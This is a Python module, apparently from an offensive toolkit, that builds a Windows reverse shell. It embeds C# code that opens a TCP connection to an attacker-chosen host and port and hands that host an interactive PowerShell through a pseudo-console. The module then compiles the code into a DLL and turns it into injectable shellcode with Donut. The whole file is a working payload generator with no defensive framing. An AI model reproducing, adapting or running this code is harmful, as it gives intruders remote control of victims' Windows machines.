import os
import sys
import tempfile
import shutil
import subprocess
from ..core.utils import console

CONPTY_SHELL_CONTENT = r"""
public class ConPtyShell
{
    [StructLayout(LayoutKind.Sequential)]
    public struct COORD { public short X; public short Y; }

    [StructLayout(LayoutKind.Sequential)]
    public struct SECURITY_ATTRIBUTES {
        public int nLength;
        public IntPtr lpSecurityDescriptor;
        public bool bInheritHandle;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct STARTUPINFOEX {
        public STARTUPINFO StartupInfo;
        public IntPtr lpAttributeList;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct STARTUPINFO {
        public uint cb;
        public string lpReserved, lpDesktop, lpTitle;
        public uint dwX, dwY, dwXSize, dwYSize, dwXCountChars, dwYCountChars, dwFillAttribute, dwFlags;
        public ushort wShowWindow, cbReserved2;
        public IntPtr lpReserved2, hStdInput, hStdOutput, hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION {
        public IntPtr hProcess, hThread;
        public uint dwProcessId, dwThreadId;
    }

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern int CreatePseudoConsole(COORD size, IntPtr hInput, IntPtr hOutput, uint dwFlags, out IntPtr phPC);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern void ClosePseudoConsole(IntPtr hPC);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern int ResizePseudoConsole(IntPtr hPC, COORD size);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFOEX lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CreatePipe(out IntPtr hReadPipe, out IntPtr hWritePipe, ref SECURITY_ATTRIBUTES lpPipeAttributes, uint nSize);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool InitializeProcThreadAttributeList(IntPtr lpAttributeList, int dwAttributeCount, int dwFlags, ref IntPtr lpSize);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool UpdateProcThreadAttribute(IntPtr lpAttributeList, uint dwFlags, IntPtr Attribute, IntPtr lpValue, IntPtr cbSize, IntPtr lpPreviousValue, IntPtr lpReturnSize);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool WriteFile(IntPtr hFile, byte[] lpBuffer, uint nNumberOfBytesToWrite, out uint lpNumberOfBytesWritten, IntPtr lpOverlapped);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool ReadFile(IntPtr hFile, byte[] lpBuffer, uint nNumberOfBytesToRead, out uint lpNumberOfBytesRead, IntPtr lpOverlapped);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool FlushFileBuffers(IntPtr hFile);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool TerminateProcess(IntPtr hProcess, uint uExitCode);

    private static byte lastChar = 0;
    private static bool running = true;

    public static void Run(string ip, int port)
    {
        TcpClient client = null;
        IntPtr hPC = IntPtr.Zero;
        PROCESS_INFORMATION pi = new PROCESS_INFORMATION();

        try {
            client = new TcpClient(ip, port);
            NetworkStream stream = client.GetStream();

            IntPtr hPipeInRead, hPipeInWrite, hPipeOutRead, hPipeOutWrite;
            SECURITY_ATTRIBUTES sa = new SECURITY_ATTRIBUTES();
            sa.nLength = Marshal.SizeOf(sa);
            sa.bInheritHandle = true;

            CreatePipe(out hPipeInRead, out hPipeInWrite, ref sa, 0);
            CreatePipe(out hPipeOutRead, out hPipeOutWrite, ref sa, 0);

            COORD size = new COORD { X = #COLS#, Y = #ROWS# };
            CreatePseudoConsole(size, hPipeInRead, hPipeOutWrite, 0, out hPC);

            IntPtr lpSize = IntPtr.Zero;
            InitializeProcThreadAttributeList(IntPtr.Zero, 1, 0, ref lpSize);
            IntPtr lpAttributeList = Marshal.AllocHGlobal(lpSize);
            InitializeProcThreadAttributeList(lpAttributeList, 1, 0, ref lpSize);
            UpdateProcThreadAttribute(lpAttributeList, 0, (IntPtr)0x00020016, hPC, (IntPtr)IntPtr.Size, IntPtr.Zero, IntPtr.Zero);

            STARTUPINFOEX si = new STARTUPINFOEX();
            si.StartupInfo.cb = (uint)Marshal.SizeOf(si);
            si.lpAttributeList = lpAttributeList;

            CreateProcess(null, "powershell.exe", IntPtr.Zero, IntPtr.Zero, false, 0x00080000, IntPtr.Zero, null, ref si, out pi);

            Thread tMon = new Thread(() => {
                WaitForSingleObject(pi.hProcess, 0xFFFFFFFF);
                running = false;
                try { client.Close(); } catch {}
            });
            tMon.IsBackground = true;
            tMon.Start();

            Thread tIn = new Thread(() => {
                try {
                    byte[] buf = new byte[8192];
                    int n;
                    uint written;
                    while (running && (n = stream.Read(buf, 0, buf.Length)) > 0) {
                        List<byte> translated = new List<byte>();
                        for (int i = 0; i < n; i++) {
                            if (buf[i] == 0x08) { translated.Add(0x7F); continue; }
                            if (buf[i] == 0x0A && lastChar != 0x0D) { translated.Add(0x0D); }
                            translated.Add(buf[i]);
                            lastChar = buf[i];
                        }
                        byte[] finalBuf = translated.ToArray();
                        WriteFile(hPipeInWrite, finalBuf, (uint)finalBuf.Length, out written, IntPtr.Zero);
                        FlushFileBuffers(hPipeInWrite);
                    }
                } catch {}
            });
            tIn.IsBackground = true;
            tIn.Start();

            byte[] buf2 = new byte[8192];
            uint read;
            while (running && ReadFile(hPipeOutRead, buf2, (uint)buf2.Length, out read, IntPtr.Zero) && read > 0) {
                stream.Write(buf2, 0, (int)read);
                stream.Flush();
            }
        } catch { }
        finally {
            running = false;
            if (hPC != IntPtr.Zero) try { ClosePseudoConsole(hPC); } catch {}
            if (pi.hProcess != IntPtr.Zero) try { TerminateProcess(pi.hProcess, 0); } catch {}
            if (client != null) try { client.Close(); } catch {}
        }
    }
}
"""

BASE_DLL_CONTENT = r"""
public class Exports
{
    public static void RunProcess(IntPtr hwnd, IntPtr hinst, string lpszCmdLine, int nCmdShow)
    {
        MainLogic();
    }

    public static void Start()
    {
        MainLogic();
    }

    public static void MainLogic()
    {
        try {
            ConPtyShell.Run("#LHOST#", #LPORT#);
        } catch {}
    }
}
"""

def generate(lhost, lport, cols=120, rows=30):
    console.print(f"[bold blue][*] Generating pty-win shellcode via Donut ({cols}x{rows})...[/bold blue]")
    temp_dir = tempfile.mkdtemp()
    try:
        cs_file = os.path.join(temp_dir, "pty.cs")
        dll_file = os.path.join(temp_dir, "pty.dll")
        bin_file = os.path.join(temp_dir, "pty.bin")
        
        # Combined C# code with using statements at the top
        full_code = r"""
using System;
using System.Text;
using System.Security.Cryptography;
using System.IO;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Threading;
using System.Net.Sockets;
using System.Collections.Generic;

""" + CONPTY_SHELL_CONTENT + "\n" + BASE_DLL_CONTENT
        
        full_code = full_code.replace("#LHOST#", lhost).replace("#LPORT#", str(lport))
        full_code = full_code.replace("#COLS#", str(cols)).replace("#ROWS#", str(rows))
        
        with open(cs_file, "w") as f:
            f.write(full_code)
            
        # Compile to DLL
        cmd_mcs = ["mcs", "-target:library", "-out:" + dll_file, cs_file, "-platform:x64"]
        res_mcs = subprocess.run(cmd_mcs, capture_output=True, text=True)
        if res_mcs.returncode != 0:
            console.print("[bold red][-] MCS Compilation failed:[/bold red]")
            console.print(res_mcs.stderr)
            sys.exit(1)
            
        # Donut to BIN
        cmd_donut = ["donut", "-i", dll_file, "-o", bin_file, "-a", "2", "-c", "Exports", "-m", "MainLogic"]
        res_donut = subprocess.run(cmd_donut, capture_output=True, text=True)
        if res_donut.returncode != 0:
            console.print("[bold red][-] Donut failed:[/bold red]")
            console.print(res_donut.stderr)
            sys.exit(1)
            
        if os.path.exists(bin_file):
            with open(bin_file, "rb") as f:
                return f.read()
        else:
            console.print("[bold red][-] Donut output bin not found.[/bold red]")
            sys.exit(1)
            
    finally:
        shutil.rmtree(temp_dir)
